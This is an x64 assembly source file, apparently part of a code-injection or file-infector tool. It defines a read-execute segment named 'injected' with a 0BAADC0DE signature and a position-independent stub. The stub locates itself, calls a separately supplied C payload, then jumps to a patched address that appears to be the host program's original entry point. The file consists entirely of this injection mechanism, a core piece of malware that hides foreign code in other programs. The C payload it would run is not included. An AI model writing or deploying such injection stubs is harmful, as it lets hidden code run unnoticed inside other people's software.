PUBLIC __payload_start
PUBLIC signature
PUBLIC payload
PUBLIC to_c_code
PUBLIC delta_start

injected SEGMENT READ EXECUTE
__payload_start:

    signature LABEL DWORD
        dd 0BAADC0DEh

    payload PROC
        ; int 3
        call _next  ; push rip; jmp _next
    _next:
        pop rbp     ; rbp = rip
        sub rbp, _next - payload

        mov rbx, [rbp + (to_c_code - payload)]
        add rbx, rbp
        enter 1000h, 0  ; Reserve 0x1000 bytes on the stack for the C payload
        call rbx
        leave           ; Restore the stack

        mov rbx, [rbp + (delta_start - payload)]
        add rbx, rbp
        push rbp
        call rbx
    payload ENDP

    to_c_code LABEL QWORD
        dq 0

    delta_start LABEL SQWORD
        dq 0

injected ENDS

END
